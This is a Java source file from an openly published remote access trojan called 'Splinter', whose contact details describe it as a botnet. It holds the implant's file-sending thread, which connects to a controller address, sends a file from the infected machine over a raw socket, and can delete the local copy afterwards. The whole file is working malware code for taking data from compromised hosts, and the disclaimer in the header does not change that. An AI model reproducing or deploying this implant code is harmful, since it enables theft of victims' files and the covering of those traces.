/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/




package Implant.FTP;

import Implant.Driver;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.EOFException;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.PrintWriter;
import java.net.ConnectException;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;

public class FTP_Thread_Sender extends Thread
  implements Runnable
{
  String strMyClassName = "FTP_Thread_Sender";

  IncrementObject statusIncrementObject = null;

  boolean i_am_implant_daemon = false;
  boolean i_am_controller_daemon = false;
  String controllerAddr;
  int PORT = 21;
  int maxBufferSize = 1024;
  File fleToSend = null;
  long fleSizeToSend = 1L;

  long beginFileTransferTime = 1L;
  long endFileTransferTime = 1L;

  int readBufferSize = 4096;

  int bytesReadFromSocket = 0;

  byte[] arSendFile_ByteArray = null;
  int continueBufferRead = 0;
  int totalBytesRead_FromFile = 0;
  int bytesReadFromFile = 0;

  InputStream is_FTP_SendFileIn = null;
  BufferedInputStream brin_OutFile = null;
  BufferedOutputStream brOut_SktConnection = null;

  DataOutputStream dos_SktConnection = null;
  DataInputStream dis_SktConnection = null;
  FileInputStream fis_FileToSend = null;
  DataInputStream dis_SendFile = null;
  FileOutputStream fos_OutFile = null;

  public boolean deleteFileAfterSending = false;

  Socket sktConnection = null;

  String strIPToSendFileTo = "";
  int port = 0;

  String strConnectionTimeStamp = "UNKNOWN";
  PrintWriter pwSocket = null;

  String SPECIAL_FILE_SEND_TYPE = "";

  public FTP_Thread_Sender(boolean implant_daemon, boolean controller_daemon, String controllerIP, int prt, int maxBuffer, File fleSend, PrintWriter pwOut, boolean deleteFileAfterSnd, String sendingFileType_its_ok_to_leave_null, IncrementObject incrementStatusObject)
  {
    this.i_am_implant_daemon = implant_daemon;
    this.i_am_controller_daemon = controller_daemon;
    this.controllerAddr = controllerIP;
    this.PORT = prt;
    this.maxBufferSize = maxBuffer;
    this.fleToSend = fleSend;
    this.pwSocket = pwOut;
    this.deleteFileAfterSending = deleteFileAfterSnd;
    this.statusIncrementObject = incrementStatusObject;

    if (sendingFileType_its_ok_to_leave_null == null)
    {
      this.SPECIAL_FILE_SEND_TYPE = "";
    }
    else
    {
      this.SPECIAL_FILE_SEND_TYPE = ("%%%%%" + sendingFileType_its_ok_to_leave_null);
    }
  }

  public void run()
  {
    try
    {
      if ((this.fleToSend == null) || (!this.fleToSend.exists()) || (!this.fleToSend.isFile()))
      {
        Driver.sop("File not found to send!");

        if (this.statusIncrementObject != null) {
          this.statusIncrementObject.incrementStep();
        }
        if (this.pwSocket != null)
        {
          this.pwSocket.println("Error!!! File: " + this.fleToSend + " not found!");
          this.pwSocket.flush();
        }

      }
      else
      {
        connectAndSendFile(this.controllerAddr, this.PORT, this.fleToSend);
      }

      try
      {
        if (this.statusIncrementObject != null) {
          this.statusIncrementObject.incrementStep();
        }
        if (this.dis_SktConnection != null) {
          this.dis_SktConnection.close();
        }
        if (this.dos_SktConnection != null) {
          this.dos_SktConnection.close();
        }
        if ((this.sktConnection != null) && (this.sktConnection.isConnected())) {
          this.sktConnection.close();
        }
        if (this.fis_FileToSend != null) {
          this.fis_FileToSend.close();
        }

      }
      catch (Exception localException1)
      {
      }

    }
    catch (Exception e)
    {
      Driver.eop("run", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }
  }

  public boolean connectAndSendFile(String address, int port, File fle)
  {
    try
    {
      boolean proceedToSendFile = false;

      Driver.sop("Attempting to connect to : " + address + " : " + port + " to send file: " + fle.getName());

      this.sktConnection = new Socket(address, port);

      if ((this.sktConnection != null) && (this.sktConnection.isConnected()) && (!this.sktConnection.isOutputShutdown()) && (fle.exists()))
      {
        this.dos_SktConnection = new DataOutputStream(this.sktConnection.getOutputStream());
        this.dis_SktConnection = new DataInputStream(this.sktConnection.getInputStream());

        this.fleSizeToSend = fle.length();

        this.dos_SktConnection.writeUTF(Driver.myImplant_Type + "%%%%%" + fle.getName() + "%%%%%" + fle.length() + this.SPECIAL_FILE_SEND_TYPE);
        this.dos_SktConnection.flush();

        String response = this.dis_SktConnection.readUTF();

        if (response.equalsIgnoreCase("PROCEED")) {
          proceedToSendFile = true;
        }
        if (proceedToSendFile)
        {
          this.beginFileTransferTime = System.currentTimeMillis();

          this.fis_FileToSend = new FileInputStream(fle);

          this.arSendFile_ByteArray = new byte[this.readBufferSize];
          this.totalBytesRead_FromFile = 0;

          while ((this.bytesReadFromFile = this.fis_FileToSend.read(this.arSendFile_ByteArray)) > 0)
          {
            this.dos_SktConnection.write(this.arSendFile_ByteArray);
            this.dos_SktConnection.flush();

            if (this.bytesReadFromFile >= 0) {
              this.totalBytesRead_FromFile += this.bytesReadFromFile;
            }

          }

          this.fis_FileToSend.close();

          boolean fileDeleted = true;

          if (this.totalBytesRead_FromFile == this.fleSizeToSend)
          {
            this.endFileTransferTime = System.currentTimeMillis();

            if (this.deleteFileAfterSending)
            {
              try
              {
                Driver.sop("Attempting to delete File: " + fle.getCanonicalPath());
                fileDeleted = fle.delete();

                Driver.sop(" -->File Deleted"); } catch (Exception e) {
                Driver.sop("Could not delete file: " + fle.getCanonicalPath());
              }
            }
          }

          Driver.sop("Successful Tx: \"" + fle.getName() + "\"" + " Size: " + Driver.getFormattedFileSize_String(this.totalBytesRead_FromFile));

          if (this.pwSocket != null)
          {
            this.pwSocket.println("File " + fle.getName() + " successfully transmitted to requestor");
            this.pwSocket.flush();
          }

          if (this.deleteFileAfterSending)
          {
            try
            {
              Driver.sop("Attempting to delete File: " + fle.getCanonicalPath());
              fileDeleted = fle.delete();

              Driver.sop(" -->File Deleted"); } catch (Exception e) {
              Driver.sop("Could not delete file: " + fle.getCanonicalPath());
            }
          }
        }
        else
        {
          try
          {
            Driver.sop("File \" " + fle.getCanonicalPath() + "\" was not sent.  It was rejected by Controller"); } catch (Exception e) {
            Driver.sop("File was not sent.  It was rejected by Controller");
          }
        }

      }
      else
      {
        Driver.sop("Error with the server.  Please try again!");

        if (this.pwSocket != null)
        {
          this.pwSocket.println("Error with the server.  Please try again!");
          this.pwSocket.flush();
        }

        return false;
      }

      return true;
    }
    catch (EOFException eofe)
    {
      Driver.sop("ERROR!!!  Could not establish a connection and response with " + address + " : " + port);
    }
    catch (ConnectException ce)
    {
      Driver.sop("ERROR!!  Could not establish a connection and response with " + address + " : " + port);
    }
    catch (UnknownHostException uhe)
    {
      Driver.sop("ERROR!!!!  Could not establish a connection and response with " + address + " : " + port);
      return false;
    }
    catch (SocketException se)
    {
      Driver.sop("ERROR!!! Could not send file...the streams were closed.");
    }
    catch (Exception e)
    {
      Driver.eop("connectAndSendFile", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }
}